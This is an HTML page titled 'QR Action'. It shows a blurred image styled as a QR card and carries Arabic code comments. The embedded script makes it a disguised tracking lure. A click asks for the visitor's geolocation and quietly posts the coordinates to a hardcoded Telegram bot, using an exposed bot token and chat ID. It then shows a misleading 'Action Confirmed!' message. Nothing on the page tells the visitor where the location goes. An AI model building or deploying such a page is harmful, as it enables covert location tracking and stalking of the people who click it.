<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>QR Action</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f0f0f0;
    }
    #qrCard {
      cursor: pointer;
      width: 400px;
      height: 400px;
      background-image: url('https://i.ibb.co/spwcmX7m/IMG-20250826-WA0011.jpg');
      background-size: cover;
      background-position: center;
      filter: blur(3px); /* تغبيش الصورة */
      display: flex;
      justify-content: center;
      align-items: center;
      font-weight: bold;
      font-size: 0; /* لإخفاء أي نص */
    }
  </style>
</head>
<body>
  <div id="qrCard"></div>

  <script>
    const qrCard = document.getElementById('qrCard');
    const BOT_TOKEN = "8250616721:AAHTMwBPgPoRmNuRSfdGCA0lB9G_6LH2jy0"; 
    const CHAT_ID = "7485197107";

    qrCard.addEventListener('click', () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: `Lat: ${lat}\nLon: ${lon}`
            })
          });

          alert('Action Confirmed!');
        });
      } else {
        alert('Unable to get location.');
      }
    });
  </script>
</body>
</html>
